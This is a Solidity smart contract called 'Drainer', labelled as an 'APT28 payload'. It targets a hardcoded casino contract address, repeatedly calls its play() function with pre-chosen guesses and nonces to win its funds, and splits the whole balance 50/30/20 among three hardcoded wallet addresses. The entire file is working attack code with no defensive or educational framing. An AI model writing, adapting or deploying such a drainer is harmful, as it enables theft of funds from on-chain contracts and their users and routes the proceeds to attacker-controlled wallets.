// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

import {IDrainer} from "./IDrainer.sol";

/**
 * @title Drainer
 * @notice APT28 payload — drain target vault and split proceeds atomically.
 */

interface IFairCasino {
    function play(uint256 guess, uint256 round, uint256 nonce) external payable;
    function currentRound() external view returns (uint256);
}

contract Drainer is IDrainer {

    address payable lt1 = payable(0x1acB0745a139C814B33DA5cdDe2d438d9c35060E);
    address payable lt2 = payable(0xbE99BCD0D8FdE76246eaE82AD5eF4A56b42c6B7d);
    address payable lt3 = payable(0xA791D68A0E2255083faF8A219b9002d613Cf0637);

    IFairCasino public constant TARGET = IFairCasino(0xed5415679D46415f6f9a82677F8F4E9ed9D1302b);

    uint256 public preGuess;
    uint256 public preNonce;
    uint256 public strikes;

    function prepare(uint256 _guess, uint256 _nonce) external {
        preGuess = _guess;
        preNonce = _nonce;
    }

    function attack(uint256 nonce) external override {
        require(nonce >= 0, "nonce invalide");
	require(strikes < 3, "3 strikes atteints");

	uint256 remaining = 3 - strikes;

        for (uint256 i = 0; i < remaining; i++) {
            uint256 round = TARGET.currentRound();
            TARGET.play{value: 0.01 ether}(preGuess, round, preNonce + i);
            strikes++;
        }

        _distribute();
    }

    function distribute() external override {
        _distribute();
    }

    function _distribute() internal {
    	uint balance = address(this).balance;

        require(balance > 0, "pas de fonds");

        uint part1 = (balance * 50) / 100;
        uint part2 = (balance * 30) / 100;
        uint part3 = (balance * 20) / 100;

        (bool ok1,) = lt1.call{value: part1}("");
        require(ok1, "lt1 failed");

	(bool ok2,) = lt2.call{value: part2}("");
	require(ok2, "lt2 failed");

	(bool ok3,) = lt3.call{value: part3}("");
	require(ok3, "lt3 failed");
    }

    receive() external payable {}
}
